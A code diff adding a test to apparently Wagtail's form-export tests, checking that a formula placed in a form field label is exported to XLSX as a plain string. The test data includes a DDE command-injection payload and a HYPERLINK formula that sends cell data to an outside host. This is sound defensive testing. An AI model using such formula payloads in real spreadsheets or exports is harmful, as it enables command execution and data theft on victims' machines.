@@ -829,6 +829,28 @@ class TestFormsSubmissionsExport(WagtailTestUtils, TestCase):
         self.assertEqual(rows[3][1].value, "=cmd|' /C calc'!A0")
         self.assertEqual(rows[3][1].data_type, "s")  # string, not formula
 
+    def test_list_submissions_xlsx_export_formula_injection_in_heading(self):
+        formula_label = '=HYPERLINK("http://example.com/?data=" & A2, "Details")'
+        FormField.objects.create(
+            page=self.form_page,
+            sort_order=4,
+            label=formula_label,
+            field_type="singleline",
+            required=False,
+        )
+        response = self.client.post(
+            reverse("wagtailforms:list_submissions", args=(self.form_page.id,)),
+            query_params={"export": "xlsx"},
+        )
+
+        self.assertEqual(response.status_code, 200)
+        workbook_data = response.getvalue()
+        worksheet = load_workbook(filename=BytesIO(workbook_data))["Sheet1"]
+        header_row = next(worksheet.rows)
+        header_cell = header_row[-1]
+        self.assertEqual(header_cell.value, formula_label)
+        self.assertEqual(header_cell.data_type, "s")  # string, not formula
+
     def test_list_submissions_csv_large_export(self):
         for i in range(100):
             new_form_submission = FormSubmission.objects.create(
